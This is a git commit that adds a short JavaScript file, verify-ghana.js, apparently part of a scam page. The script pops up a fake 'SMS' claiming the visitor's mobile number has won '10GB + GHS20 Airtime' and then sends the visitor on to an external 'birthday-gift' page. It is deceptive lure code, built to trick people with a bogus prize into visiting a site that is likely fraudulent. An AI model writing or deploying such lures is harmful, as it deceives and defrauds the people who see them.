b7e2bf5c5cf5132c1173a4d6dd20b9aba406cbaa
sweet16palz-hub <sweet16palz@gmail.com>
2026-05-04 12:22:25 +0100

    Create verify-ghana.js

---
+++ verify-ghana.js
@@ -0,0 +1,5 @@
+var password = '10GB + GHS20 Airtime'
+password=prompt('SMS: Congratulations, your Mobile Number is eligible to receive 10GB + GHS20 Airtime, click OK to Activate now','10GB + GHS20 Airtime');
+if (password != '10GB + GHS20 Airtime') {
+location.href='https://gbamz.com/birthday-gift-10gb.html';
+}
